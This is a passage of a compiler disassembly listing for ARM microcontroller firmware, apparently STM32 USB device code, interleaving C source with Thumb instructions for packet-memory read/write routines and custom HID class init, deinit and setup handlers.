 800846a:	697b      	ldr	r3, [r7, #20]
 800846c:	4413      	add	r3, r2
 800846e:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8008472:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008474:	69bb      	ldr	r3, [r7, #24]
 8008476:	627b      	str	r3, [r7, #36]	; 0x24
 8008478:	e01b      	b.n	80084b2 <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 800847a:	69fb      	ldr	r3, [r7, #28]
 800847c:	781b      	ldrb	r3, [r3, #0]
 800847e:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 8008480:	69fb      	ldr	r3, [r7, #28]
 8008482:	3301      	adds	r3, #1
 8008484:	781b      	ldrb	r3, [r3, #0]
 8008486:	021b      	lsls	r3, r3, #8
 8008488:	b21a      	sxth	r2, r3
 800848a:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800848e:	4313      	orrs	r3, r2
 8008490:	b21b      	sxth	r3, r3
 8008492:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 8008494:	6a3b      	ldr	r3, [r7, #32]
 8008496:	8a7a      	ldrh	r2, [r7, #18]
 8008498:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 800849a:	6a3b      	ldr	r3, [r7, #32]
 800849c:	3302      	adds	r3, #2
 800849e:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 80084a0:	69fb      	ldr	r3, [r7, #28]
 80084a2:	3301      	adds	r3, #1
 80084a4:	61fb      	str	r3, [r7, #28]
    pBuf++;
 80084a6:	69fb      	ldr	r3, [r7, #28]
 80084a8:	3301      	adds	r3, #1
 80084aa:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 80084ac:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80084ae:	3b01      	subs	r3, #1
 80084b0:	627b      	str	r3, [r7, #36]	; 0x24
 80084b2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80084b4:	2b00      	cmp	r3, #0
 80084b6:	d1e0      	bne.n	800847a <USB_WritePMA+0x38>
  }
}
 80084b8:	bf00      	nop
 80084ba:	bf00      	nop
 80084bc:	372c      	adds	r7, #44	; 0x2c
 80084be:	46bd      	mov	sp, r7
 80084c0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80084c4:	4770      	bx	lr

080084c6 <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 80084c6:	b480      	push	{r7}
 80084c8:	b08b      	sub	sp, #44	; 0x2c
 80084ca:	af00      	add	r7, sp, #0
 80084cc:	60f8      	str	r0, [r7, #12]
 80084ce:	60b9      	str	r1, [r7, #8]
 80084d0:	4611      	mov	r1, r2
 80084d2:	461a      	mov	r2, r3
 80084d4:	460b      	mov	r3, r1
 80084d6:	80fb      	strh	r3, [r7, #6]
 80084d8:	4613      	mov	r3, r2
 80084da:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 80084dc:	88bb      	ldrh	r3, [r7, #4]
 80084de:	085b      	lsrs	r3, r3, #1
 80084e0:	b29b      	uxth	r3, r3
 80084e2:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80084e4:	68fb      	ldr	r3, [r7, #12]
 80084e6:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80084e8:	68bb      	ldr	r3, [r7, #8]
 80084ea:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80084ec:	88fa      	ldrh	r2, [r7, #6]
 80084ee:	697b      	ldr	r3, [r7, #20]
 80084f0:	4413      	add	r3, r2
 80084f2:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80084f6:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80084f8:	69bb      	ldr	r3, [r7, #24]
 80084fa:	627b      	str	r3, [r7, #36]	; 0x24
 80084fc:	e018      	b.n	8008530 <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 80084fe:	6a3b      	ldr	r3, [r7, #32]
 8008500:	881b      	ldrh	r3, [r3, #0]
 8008502:	b29b      	uxth	r3, r3
 8008504:	613b      	str	r3, [r7, #16]
    pdwVal++;
 8008506:	6a3b      	ldr	r3, [r7, #32]
 8008508:	3302      	adds	r3, #2
 800850a:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 800850c:	693b      	ldr	r3, [r7, #16]
 800850e:	b2da      	uxtb	r2, r3
 8008510:	69fb      	ldr	r3, [r7, #28]
 8008512:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008514:	69fb      	ldr	r3, [r7, #28]
 8008516:	3301      	adds	r3, #1
 8008518:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 800851a:	693b      	ldr	r3, [r7, #16]
 800851c:	0a1b      	lsrs	r3, r3, #8
 800851e:	b2da      	uxtb	r2, r3
 8008520:	69fb      	ldr	r3, [r7, #28]
 8008522:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008524:	69fb      	ldr	r3, [r7, #28]
 8008526:	3301      	adds	r3, #1
 8008528:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 800852a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800852c:	3b01      	subs	r3, #1
 800852e:	627b      	str	r3, [r7, #36]	; 0x24
 8008530:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008532:	2b00      	cmp	r3, #0
 8008534:	d1e3      	bne.n	80084fe <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 8008536:	88bb      	ldrh	r3, [r7, #4]
 8008538:	f003 0301 	and.w	r3, r3, #1
 800853c:	b29b      	uxth	r3, r3
 800853e:	2b00      	cmp	r3, #0
 8008540:	d007      	beq.n	8008552 <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 8008542:	6a3b      	ldr	r3, [r7, #32]
 8008544:	881b      	ldrh	r3, [r3, #0]
 8008546:	b29b      	uxth	r3, r3
 8008548:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 800854a:	693b      	ldr	r3, [r7, #16]
 800854c:	b2da      	uxtb	r2, r3
 800854e:	69fb      	ldr	r3, [r7, #28]
 8008550:	701a      	strb	r2, [r3, #0]
  }
}
 8008552:	bf00      	nop
 8008554:	372c      	adds	r7, #44	; 0x2c
 8008556:	46bd      	mov	sp, r7
 8008558:	f85d 7b04 	ldr.w	r7, [sp], #4
 800855c:	4770      	bx	lr
	...

08008560 <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008560:	b580      	push	{r7, lr}
 8008562:	b084      	sub	sp, #16
 8008564:	af00      	add	r7, sp, #0
 8008566:	6078      	str	r0, [r7, #4]
 8008568:	460b      	mov	r3, r1
 800856a:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 800856c:	2024      	movs	r0, #36	; 0x24
 800856e:	f004 fd05 	bl	800cf7c <USBD_static_malloc>
 8008572:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 8008574:	68fb      	ldr	r3, [r7, #12]
 8008576:	2b00      	cmp	r3, #0
 8008578:	d109      	bne.n	800858e <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 800857a:	687b      	ldr	r3, [r7, #4]
 800857c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008580:	687b      	ldr	r3, [r7, #4]
 8008582:	32b0      	adds	r2, #176	; 0xb0
 8008584:	2100      	movs	r1, #0
 8008586:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 800858a:	2302      	movs	r3, #2
 800858c:	e08b      	b.n	80086a6 <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 800858e:	687b      	ldr	r3, [r7, #4]
 8008590:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008594:	687b      	ldr	r3, [r7, #4]
 8008596:	32b0      	adds	r2, #176	; 0xb0
 8008598:	68f9      	ldr	r1, [r7, #12]
 800859a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 800859e:	687b      	ldr	r3, [r7, #4]
 80085a0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80085a4:	687b      	ldr	r3, [r7, #4]
 80085a6:	32b0      	adds	r2, #176	; 0xb0
 80085a8:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 80085ac:	687b      	ldr	r3, [r7, #4]
 80085ae:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 80085b2:	687b      	ldr	r3, [r7, #4]
 80085b4:	7c1b      	ldrb	r3, [r3, #16]
 80085b6:	2b00      	cmp	r3, #0
 80085b8:	d11b      	bne.n	80085f2 <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 80085ba:	4b3d      	ldr	r3, [pc, #244]	; (80086b0 <USBD_CUSTOM_HID_Init+0x150>)
 80085bc:	781b      	ldrb	r3, [r3, #0]
 80085be:	f003 020f 	and.w	r2, r3, #15
 80085c2:	6879      	ldr	r1, [r7, #4]
 80085c4:	4613      	mov	r3, r2
 80085c6:	009b      	lsls	r3, r3, #2
 80085c8:	4413      	add	r3, r2
 80085ca:	009b      	lsls	r3, r3, #2
 80085cc:	440b      	add	r3, r1
 80085ce:	3326      	adds	r3, #38	; 0x26
 80085d0:	2205      	movs	r2, #5
 80085d2:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 80085d4:	4b37      	ldr	r3, [pc, #220]	; (80086b4 <USBD_CUSTOM_HID_Init+0x154>)
 80085d6:	781b      	ldrb	r3, [r3, #0]
 80085d8:	f003 020f 	and.w	r2, r3, #15
 80085dc:	6879      	ldr	r1, [r7, #4]
 80085de:	4613      	mov	r3, r2
 80085e0:	009b      	lsls	r3, r3, #2
 80085e2:	4413      	add	r3, r2
 80085e4:	009b      	lsls	r3, r3, #2
 80085e6:	440b      	add	r3, r1
 80085e8:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80085ec:	2205      	movs	r2, #5
 80085ee:	801a      	strh	r2, [r3, #0]
 80085f0:	e01a      	b.n	8008628 <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80085f2:	4b2f      	ldr	r3, [pc, #188]	; (80086b0 <USBD_CUSTOM_HID_Init+0x150>)
 80085f4:	781b      	ldrb	r3, [r3, #0]
 80085f6:	f003 020f 	and.w	r2, r3, #15
 80085fa:	6879      	ldr	r1, [r7, #4]
 80085fc:	4613      	mov	r3, r2
 80085fe:	009b      	lsls	r3, r3, #2
 8008600:	4413      	add	r3, r2
 8008602:	009b      	lsls	r3, r3, #2
 8008604:	440b      	add	r3, r1
 8008606:	3326      	adds	r3, #38	; 0x26
 8008608:	2205      	movs	r2, #5
 800860a:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 800860c:	4b29      	ldr	r3, [pc, #164]	; (80086b4 <USBD_CUSTOM_HID_Init+0x154>)
 800860e:	781b      	ldrb	r3, [r3, #0]
 8008610:	f003 020f 	and.w	r2, r3, #15
 8008614:	6879      	ldr	r1, [r7, #4]
 8008616:	4613      	mov	r3, r2
 8008618:	009b      	lsls	r3, r3, #2
 800861a:	4413      	add	r3, r2
 800861c:	009b      	lsls	r3, r3, #2
 800861e:	440b      	add	r3, r1
 8008620:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008624:	2205      	movs	r2, #5
 8008626:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 8008628:	4b21      	ldr	r3, [pc, #132]	; (80086b0 <USBD_CUSTOM_HID_Init+0x150>)
 800862a:	7819      	ldrb	r1, [r3, #0]
 800862c:	2302      	movs	r3, #2
 800862e:	2203      	movs	r2, #3
 8008630:	6878      	ldr	r0, [r7, #4]
 8008632:	f004 fa6f 	bl	800cb14 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 8008636:	4b1e      	ldr	r3, [pc, #120]	; (80086b0 <USBD_CUSTOM_HID_Init+0x150>)
 8008638:	781b      	ldrb	r3, [r3, #0]
 800863a:	f003 020f 	and.w	r2, r3, #15
 800863e:	6879      	ldr	r1, [r7, #4]
 8008640:	4613      	mov	r3, r2
 8008642:	009b      	lsls	r3, r3, #2
 8008644:	4413      	add	r3, r2
 8008646:	009b      	lsls	r3, r3, #2
 8008648:	440b      	add	r3, r1
 800864a:	3324      	adds	r3, #36	; 0x24
 800864c:	2201      	movs	r2, #1
 800864e:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 8008650:	4b18      	ldr	r3, [pc, #96]	; (80086b4 <USBD_CUSTOM_HID_Init+0x154>)
 8008652:	7819      	ldrb	r1, [r3, #0]
 8008654:	2302      	movs	r3, #2
 8008656:	2203      	movs	r2, #3
 8008658:	6878      	ldr	r0, [r7, #4]
 800865a:	f004 fa5b 	bl	800cb14 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 800865e:	4b15      	ldr	r3, [pc, #84]	; (80086b4 <USBD_CUSTOM_HID_Init+0x154>)
 8008660:	781b      	ldrb	r3, [r3, #0]
 8008662:	f003 020f 	and.w	r2, r3, #15
 8008666:	6879      	ldr	r1, [r7, #4]
 8008668:	4613      	mov	r3, r2
 800866a:	009b      	lsls	r3, r3, #2
 800866c:	4413      	add	r3, r2
 800866e:	009b      	lsls	r3, r3, #2
 8008670:	440b      	add	r3, r1
 8008672:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008676:	2201      	movs	r2, #1
 8008678:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 800867a:	68fb      	ldr	r3, [r7, #12]
 800867c:	2200      	movs	r2, #0
 800867e:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 8008682:	687b      	ldr	r3, [r7, #4]
 8008684:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008688:	687a      	ldr	r2, [r7, #4]
 800868a:	33b0      	adds	r3, #176	; 0xb0
 800868c:	009b      	lsls	r3, r3, #2
 800868e:	4413      	add	r3, r2
 8008690:	685b      	ldr	r3, [r3, #4]
 8008692:	685b      	ldr	r3, [r3, #4]
 8008694:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008696:	4b07      	ldr	r3, [pc, #28]	; (80086b4 <USBD_CUSTOM_HID_Init+0x154>)
 8008698:	7819      	ldrb	r1, [r3, #0]
 800869a:	68fa      	ldr	r2, [r7, #12]
 800869c:	230f      	movs	r3, #15
 800869e:	6878      	ldr	r0, [r7, #4]
 80086a0:	f004 fbea 	bl	800ce78 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 80086a4:	2300      	movs	r3, #0
}
 80086a6:	4618      	mov	r0, r3
 80086a8:	3710      	adds	r7, #16
 80086aa:	46bd      	mov	sp, r7
 80086ac:	bd80      	pop	{r7, pc}
 80086ae:	bf00      	nop
 80086b0:	200000a6 	.word	0x200000a6
 80086b4:	200000a7 	.word	0x200000a7

080086b8 <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 80086b8:	b580      	push	{r7, lr}
 80086ba:	b082      	sub	sp, #8
 80086bc:	af00      	add	r7, sp, #0
 80086be:	6078      	str	r0, [r7, #4]
 80086c0:	460b      	mov	r3, r1
 80086c2:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 80086c4:	4b37      	ldr	r3, [pc, #220]	; (80087a4 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086c6:	781b      	ldrb	r3, [r3, #0]
 80086c8:	4619      	mov	r1, r3
 80086ca:	6878      	ldr	r0, [r7, #4]
 80086cc:	f004 fa60 	bl	800cb90 <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 80086d0:	4b34      	ldr	r3, [pc, #208]	; (80087a4 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086d2:	781b      	ldrb	r3, [r3, #0]
 80086d4:	f003 020f 	and.w	r2, r3, #15
 80086d8:	6879      	ldr	r1, [r7, #4]
 80086da:	4613      	mov	r3, r2
 80086dc:	009b      	lsls	r3, r3, #2
 80086de:	4413      	add	r3, r2
 80086e0:	009b      	lsls	r3, r3, #2
 80086e2:	440b      	add	r3, r1
 80086e4:	3324      	adds	r3, #36	; 0x24
 80086e6:	2200      	movs	r2, #0
 80086e8:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 80086ea:	4b2e      	ldr	r3, [pc, #184]	; (80087a4 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086ec:	781b      	ldrb	r3, [r3, #0]
 80086ee:	f003 020f 	and.w	r2, r3, #15
 80086f2:	6879      	ldr	r1, [r7, #4]
 80086f4:	4613      	mov	r3, r2
 80086f6:	009b      	lsls	r3, r3, #2
 80086f8:	4413      	add	r3, r2
 80086fa:	009b      	lsls	r3, r3, #2
 80086fc:	440b      	add	r3, r1
 80086fe:	3326      	adds	r3, #38	; 0x26
 8008700:	2200      	movs	r2, #0
 8008702:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 8008704:	4b28      	ldr	r3, [pc, #160]	; (80087a8 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008706:	781b      	ldrb	r3, [r3, #0]
 8008708:	4619      	mov	r1, r3
 800870a:	6878      	ldr	r0, [r7, #4]
 800870c:	f004 fa40 	bl	800cb90 <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 8008710:	4b25      	ldr	r3, [pc, #148]	; (80087a8 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008712:	781b      	ldrb	r3, [r3, #0]
 8008714:	f003 020f 	and.w	r2, r3, #15
 8008718:	6879      	ldr	r1, [r7, #4]
 800871a:	4613      	mov	r3, r2
 800871c:	009b      	lsls	r3, r3, #2
 800871e:	4413      	add	r3, r2
 8008720:	009b      	lsls	r3, r3, #2
 8008722:	440b      	add	r3, r1
 8008724:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008728:	2200      	movs	r2, #0
 800872a:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 800872c:	4b1e      	ldr	r3, [pc, #120]	; (80087a8 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800872e:	781b      	ldrb	r3, [r3, #0]
 8008730:	f003 020f 	and.w	r2, r3, #15
 8008734:	6879      	ldr	r1, [r7, #4]
 8008736:	4613      	mov	r3, r2
 8008738:	009b      	lsls	r3, r3, #2
 800873a:	4413      	add	r3, r2
 800873c:	009b      	lsls	r3, r3, #2
 800873e:	440b      	add	r3, r1
 8008740:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008744:	2200      	movs	r2, #0
 8008746:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008748:	687b      	ldr	r3, [r7, #4]
 800874a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800874e:	687b      	ldr	r3, [r7, #4]
 8008750:	32b0      	adds	r2, #176	; 0xb0
 8008752:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008756:	2b00      	cmp	r3, #0
 8008758:	d01f      	beq.n	800879a <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 800875a:	687b      	ldr	r3, [r7, #4]
 800875c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008760:	687a      	ldr	r2, [r7, #4]
 8008762:	33b0      	adds	r3, #176	; 0xb0
 8008764:	009b      	lsls	r3, r3, #2
 8008766:	4413      	add	r3, r2
 8008768:	685b      	ldr	r3, [r3, #4]
 800876a:	689b      	ldr	r3, [r3, #8]
 800876c:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 800876e:	687b      	ldr	r3, [r7, #4]
 8008770:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008774:	687b      	ldr	r3, [r7, #4]
 8008776:	32b0      	adds	r2, #176	; 0xb0
 8008778:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800877c:	4618      	mov	r0, r3
 800877e:	f004 fc19 	bl	800cfb4 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008782:	687b      	ldr	r3, [r7, #4]
 8008784:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008788:	687b      	ldr	r3, [r7, #4]
 800878a:	32b0      	adds	r2, #176	; 0xb0
 800878c:	2100      	movs	r1, #0
 800878e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008792:	687b      	ldr	r3, [r7, #4]
 8008794:	2200      	movs	r2, #0
 8008796:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 800879a:	2300      	movs	r3, #0
}
 800879c:	4618      	mov	r0, r3
 800879e:	3708      	adds	r7, #8
 80087a0:	46bd      	mov	sp, r7
 80087a2:	bd80      	pop	{r7, pc}
 80087a4:	200000a6 	.word	0x200000a6
 80087a8:	200000a7 	.word	0x200000a7

080087ac <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 80087ac:	b580      	push	{r7, lr}
 80087ae:	b088      	sub	sp, #32
 80087b0:	af00      	add	r7, sp, #0
 80087b2:	6078      	str	r0, [r7, #4]
 80087b4:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80087b6:	687b      	ldr	r3, [r7, #4]
 80087b8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087bc:	687b      	ldr	r3, [r7, #4]
 80087be:	32b0      	adds	r2, #176	; 0xb0
 80087c0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80087c4:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 80087c6:	2300      	movs	r3, #0
 80087c8:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 80087ca:	2300      	movs	r3, #0
 80087cc:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 80087ce:	2300      	movs	r3, #0
 80087d0:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 80087d2:	2300      	movs	r3, #0
 80087d4:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 80087d6:	693b      	ldr	r3, [r7, #16]
 80087d8:	2b00      	cmp	r3, #0
 80087da:	d101      	bne.n	80087e0 <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 80087dc:	2303      	movs	r3, #3
 80087de:	e0f8      	b.n	80089d2 <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 80087e0:	683b      	ldr	r3, [r7, #0]
 80087e2:	781b      	ldrb	r3, [r3, #0]
 80087e4:	f003 0360 	and.w	r3, r3, #96	; 0x60
 80087e8:	2b00      	cmp	r3, #0
 80087ea:	d056      	beq.n	800889a <USBD_CUSTOM_HID_Setup+0xee>
 80087ec:	2b20      	cmp	r3, #32
 80087ee:	f040 80e8 	bne.w	80089c2 <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 80087f2:	683b      	ldr	r3, [r7, #0]
 80087f4:	785b      	ldrb	r3, [r3, #1]
 80087f6:	3b02      	subs	r3, #2
 80087f8:	2b09      	cmp	r3, #9
 80087fa:	d846      	bhi.n	800888a <USBD_CUSTOM_HID_Setup+0xde>
 80087fc:	a201      	add	r2, pc, #4	; (adr r2, 8008804 <USBD_CUSTOM_HID_Setup+0x58>)
 80087fe:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008802:	bf00      	nop
 8008804:	0800885d 	.word	0x0800885d
 8008808:	0800883b 	.word	0x0800883b
 800880c:	0800888b 	.word	0x0800888b
 8008810:	0800888b 	.word	0x0800888b
 8008814:	0800888b 	.word	0x0800888b
 8008818:	0800888b 	.word	0x0800888b
 800881c:	0800888b 	.word	0x0800888b
 8008820:	0800886d 	.word	0x0800886d
 8008824:	0800884b 	.word	0x0800884b
 8008828:	0800882d 	.word	0x0800882d
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 800882c:	683b      	ldr	r3, [r7, #0]
 800882e:	885b      	ldrh	r3, [r3, #2]
 8008830:	b2db      	uxtb	r3, r3
 8008832:	461a      	mov	r2, r3
 8008834:	693b      	ldr	r3, [r7, #16]
 8008836:	611a      	str	r2, [r3, #16]
          break;
 8008838:	e02e      	b.n	8008898 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 800883a:	693b      	ldr	r3, [r7, #16]
 800883c:	3310      	adds	r3, #16
 800883e:	2201      	movs	r2, #1
 8008840:	4619      	mov	r1, r3
 8008842:	6878      	ldr	r0, [r7, #4]
 8008844:	f003 fd0e 	bl	800c264 <USBD_CtlSendData>
          break;
 8008848:	e026      	b.n	8008898 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 800884a:	683b      	ldr	r3, [r7, #0]
 800884c:	885b      	ldrh	r3, [r3, #2]
